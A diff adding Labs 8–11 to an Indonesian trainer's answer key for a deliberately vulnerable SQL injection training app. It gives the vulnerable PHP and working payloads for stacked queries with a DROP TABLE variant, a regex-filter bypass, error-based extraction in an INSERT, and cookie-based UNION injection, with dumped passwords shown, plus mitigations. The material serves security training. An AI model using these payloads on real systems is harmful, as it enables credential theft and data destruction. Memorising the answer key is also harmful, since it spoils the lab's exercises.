@@ -1,7 +1,7 @@
 # Kunci Jawaban — SQL Injection Lab (VulnShop)
 
 > 📌 **Untuk trainer/pendamping.** Dokumen ini berisi payload final, langkah lengkap, dan
-> penjelasan *kenapa* tiap payload berhasil untuk ke-7 lab di [README.md](README.md). Jangan
+> penjelasan *kenapa* tiap payload berhasil untuk ke-11 lab di [README.md](README.md). Jangan
 > dibagikan ke peserta sebelum sesi lab selesai — tujuannya sebagai pegangan koreksi, bukan
 > bahan lab itu sendiri.
 >
@@ -232,6 +232,171 @@ sebagai sinyal true/false, bukan teks/error).
 
 ---
 
+## Lab 8 — Stacked Queries (`lab8_stacked_queries.php`)
+
+**Kode:**
+```php
+mysqli_report(MYSQLI_REPORT_OFF); // dari db.php
+$query = "INSERT INTO notes (text) VALUES ('$note')";
+$mysqli->multi_query($query);
+```
+Bedanya dengan semua lab lain di aplikasi ini: kode memanggil `mysqli_multi_query()`, bukan
+`query()`/`prepare()`. `multi_query()` secara eksplisit mendukung eksekusi lebih dari satu
+statement SQL yang dipisah `;` dalam satu pemanggilan — inilah yang membuat *stacked queries*
+mungkin di sini padahal tidak mungkin di lab-lab lain (Lab 1–7 dan 9–11) walau sama-sama rentan
+terhadap SQLi biasa.
+
+Tabel `notes` (lihat `db/init.sql`) sengaja dibuat **terpisah** dari tabel `users`/`products`
+yang dipakai lab lain, supaya payload destruktif (`DROP TABLE`) di lab ini tidak pernah merusak
+data lab lain. Halaman ini juga menjalankan `CREATE TABLE IF NOT EXISTS notes (...)` di awal
+setiap load, sehingga self-healing kalau tabelnya sempat di-DROP.
+
+**Payload:**
+```
+note=x'); INSERT INTO notes (text) VALUES ('injected via stacked query'); -- 
+```
+
+**Kenapa berhasil:** Payload menutup statement `INSERT` pertama dengan `')`, menambahkan `;`
+lalu statement `INSERT` kedua yang sepenuhnya baru, kemudian mengomentari sisa query asli
+(`')`) dengan `-- `. Karena `multi_query()` mengeksekusi keduanya, muncul baris baru di tabel
+`notes` yang tidak pernah diketik langsung lewat form.
+
+Query yang benar-benar dieksekusi (dua statement sekaligus):
+```sql
+INSERT INTO notes (text) VALUES ('x'); INSERT INTO notes (text) VALUES ('injected via stacked query'); -- ')
+```
+
+**Hasil:** Tabel notes menampilkan baris tambahan `injected via stacked query` yang tidak pernah
+dikirim lewat alur normal form.
+
+> **Varian destruktif (opsional, untuk didemokan sekali saja):**
+> `note=x'); DROP TABLE notes; -- ` akan benar-benar men-DROP tabel `notes`. Reload halaman akan
+> otomatis membuatnya ulang (kosong) karena guard `CREATE TABLE IF NOT EXISTS` di awal skrip.
+> Sudah diverifikasi berjalan (drop lalu auto-recreate) terhadap MySQL 8 asli.
+
+---
+
+## Lab 9 — Filter/WAF Bypass (`lab9_filter_bypass.php`)
+
+**Kode:**
+```php
+if (preg_match('/union\s+select/i', $category)) {
+    die('Payload berbahaya terdeteksi!');
+}
+$query = "SELECT id, name, price FROM products WHERE category = '$category'";
+```
+Filter ini hanya mencocokkan frasa literal "union" + satu atau lebih whitespace (`\s+`, jadi
+spasi, tab, atau baris baru **tetap kena blokir**) + "select", case-insensitive. Selain itu,
+query di baliknya persis sama rentannya dengan Lab 3 — string concatenation biasa.
+
+**Payload:**
+```
+category=nonexistent' UNION/**/SELECT username,password,role FROM users-- -
+```
+
+**Kenapa berhasil:** Regex `\s+` **tidak** mencocokkan karakter `/`, `*` — jadi komentar inline
+MySQL `/**/` di antara `UNION` dan `SELECT` membuat frasa "union select" tidak pernah muncul
+sebagai satu string yang match dengan regex-nya, sementara MySQL sendiri tetap memperlakukan
+`/**/` sebagai pemisah token yang sah antar keyword (setara whitespace secara sintaksis untuk
+parser MySQL, meski tidak secara tekstual untuk regex). Sudah diverifikasi: payload dengan spasi
+biasa **diblokir** oleh filter, sedangkan payload dengan `/**/` **lolos** filter dan tetap
+tereksekusi sebagai UNION SELECT yang valid di MySQL 8 asli.
+
+**Hasil:**
+
+| ID | Name (=username) | Price (=role) |
+|---|---|---|
+| ... | admin | admin |
+| ... | alice | user |
+| ... | bob | user |
+
+(kolom "Name" pada baris UNION menampilkan `username`, kolom "Price" menampilkan `role`; untuk
+melihat password, ganti `role` di payload dengan `password` atau tambahkan kolom sesuai kebutuhan.)
+
+---
+
+## Lab 10 — SQLi pada `INSERT` (`lab10_insert_based.php`)
+
+**Kode:**
+```php
+$query = "INSERT INTO reg_demo_users (username, bio) VALUES ('$username', '$bio')";
+$res = $mysqli->query($query);
+if ($res === false) {
+    // menampilkan mysqli_error($conn) mentah - sama seperti Lab 3
+}
+```
+Tabel `reg_demo_users` sengaja terpisah dari tabel `users` yang asli (lihat `db/init.sql`),
+supaya lab ini tidak mengganggu data akun sungguhan yang dipakai lab lain.
+
+**Payload (field Bio, username boleh diisi bebas mis. `tester`):**
+```
+' OR extractvalue(1,concat(0x7e,(SELECT password FROM users LIMIT 1))))-- 
+```
+
+**Kenapa berhasil:** Karena tabel `reg_demo_users` cuma punya 2 kolom (`username`, `bio`), kita
+tidak bisa menambah value baru dengan koma (akan memicu error "Column count doesn't match value
+count" duluan, sebelum sempat memicu error yang kita mau). Trik yang dipakai: tutup literal
+string `bio` lebih awal dengan `'` (menghasilkan string kosong `''`), lalu gabungkan dengan
+`OR extractvalue(...)` — ini tetap **satu** ekspresi/value tunggal (bukan value baru), sehingga
+jumlah kolom tetap 2. `extractvalue()` diberi argumen kedua berupa XPath yang sengaja tidak
+valid (`concat(0x7e, (subquery))`), sehingga MySQL melempar error yang menyertakan isi subquery
+di pesannya. Perhatikan pemakaian `''` (string kosong), **bukan** `'x'` — MySQL 8 berjalan dalam
+`STRICT_TRANS_TABLES` untuk statement `INSERT`, sehingga `'x' OR ...` akan gagal duluan dengan
+error konversi tipe (`Truncated incorrect DOUBLE value: 'x'`) sebelum sempat mengevaluasi
+`extractvalue()` — sudah diverifikasi langsung terhadap MySQL 8 asli, dan `''` tidak memicu
+masalah konversi yang sama.
+
+Query yang benar-benar dieksekusi:
+```sql
+INSERT INTO reg_demo_users (username, bio) VALUES ('tester', '' OR extractvalue(1,concat(0x7e,(SELECT password FROM users LIMIT 1))))-- ')
+```
+
+**Hasil:** `SQL Error: XPATH syntax error: '~S3cr3tAdminPass!'`
+
+---
+
+## Lab 11 — SQLi lewat Cookie (`lab11_cookie_based.php`)
+
+**Kode:**
+```php
+$tracking_id = $_COOKIE['TrackingId'];
+$query = "SELECT id, name, description, price FROM products WHERE id = '$tracking_id' LIMIT 1";
+```
+Titik injeksinya adalah cookie `TrackingId` (di-set otomatis oleh server saat pertama kali buka
+halaman ini) — bukan parameter URL atau field form yang kelihatan. Strukturnya identik dengan
+query Lab 2.
+
+**Payload (set sebagai nilai cookie `TrackingId`, lewat DevTools/Burp atau form bantuan di
+halaman lab):**
+```
+0' UNION SELECT username,password,role,1 FROM users-- -
+```
+
+**Kenapa berhasil:** Sama seperti Lab 2 — nilai cookie disambung langsung ke `WHERE id = '...'`
+tanpa escaping, dan tabel `products` di-SELECT dengan 4 kolom (`id, name, description, price`)
+yang cocok dengan jumlah kolom `users` yang diambil (`username, password, role`, ditambah `1`
+sebagai kolom ke-4). Komentar `-- -` juga menghapus klausa `LIMIT 1` bawaan template, sehingga
+seluruh baris `users` ikut tampil, bukan cuma satu.
+
+Query yang benar-benar dieksekusi:
+```sql
+SELECT id, name, description, price FROM products WHERE id = '0' UNION SELECT username,password,role,1 FROM users-- -' LIMIT 1
+```
+
+**Hasil:**
+
+| ID (=username) | Name (=password) | Description (=role) | Price |
+|---|---|---|---|
+| admin | S3cr3tAdminPass! | admin | 1.00 |
+| alice | alice123 | user | 1.00 |
+| bob | bobpass99 | user | 1.00 |
+
+**Poin diskusi:** review kode/pentest yang hanya memeriksa parameter URL dan field form akan
+melewatkan titik injeksi ini — cookie, header, dan kanal "tersembunyi" lain butuh perlakuan yang
+sama karena tetap menjadi input yang mencapai query SQL.
+
+---
+
 ## Ringkasan hasil akhir
 
 | Lab | Teknik | Hasil yang harus didapat |
@@ -243,9 +408,19 @@ sebagai sinyal true/false, bukan teks/error).
 | 5 | Blind time-based | `S3cr3tAdminPass!` diekstrak dari selisih waktu respons (`SLEEP`) |
 | 6 | Second-order | `S3cr3tAdminPass!` muncul di "Bio" lewat username yang di-UNION |
 | 7 | ORDER BY | Password admin diekstrak lewat perubahan urutan baris (`CASE WHEN`) |
+| 8 | Stacked queries | Baris baru muncul di tabel `notes` lewat statement `INSERT` kedua yang disisipkan |
+| 9 | Filter/WAF bypass | UNION SELECT lolos filter blacklist lewat pemisah `/**/` |
+| 10 | INSERT-based (error) | `S3cr3tAdminPass!` muncul di pesan error MySQL lewat field `bio` saat registrasi |
+| 11 | SQLi via cookie | `admin / S3cr3tAdminPass! / admin` (+ alice, bob) lewat cookie `TrackingId` |
 
 ## Mitigasi (ringkas, lihat [README.md](README.md) untuk versi lengkap)
 - Prepared statements/parameterized queries di semua lab (termasuk Lab 6 tahap kedua).
 - Whitelist nama kolom/arah sort untuk Lab 7, jangan pernah concatenate input ke `ORDER BY`.
-- Least privilege akun DB, disable raw SQL error ke user (Lab 3), dan validasi ulang data setiap
-  kali dipakai di query baru (Lab 6) — bukan cuma saat pertama disimpan.
+- Least privilege akun DB, disable raw SQL error ke user (Lab 3 dan Lab 10), dan validasi ulang
+  data setiap kali dipakai di query baru (Lab 6) — bukan cuma saat pertama disimpan.
+- Lab 8: jangan pernah pakai `multi_query()`/`PDO::MYSQL_ATTR_MULTI_STATEMENTS` dengan input
+  yang tidak tepercaya.
+- Lab 9: blacklist keyword tidak pernah cukup sebagai satu-satunya pertahanan — gunakan
+  parameterized query.
+- Lab 11: perlakukan cookie/header sebagai input tidak tepercaya, sama seperti parameter
+  URL/form.
